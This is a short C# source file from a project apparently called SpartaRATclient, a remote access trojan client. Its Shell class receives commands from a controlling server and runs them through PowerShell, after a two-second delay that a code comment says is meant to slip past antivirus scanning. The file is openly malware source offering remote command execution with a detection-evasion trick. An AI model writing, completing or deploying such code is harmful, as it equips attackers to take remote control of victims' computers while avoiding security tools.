using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class Shell
    {
        private Server server;
        public Shell(Server server) 
        {
            this.server = server;
        }

        public void Run(string command)
        {
            Thread.Sleep(2000); //AV's have a very short time to scan files to not interrupt the user's workflow
            Powershell PowershellCommand = new Powershell();
            PowershellCommand.Run(command);
        }
    }
}
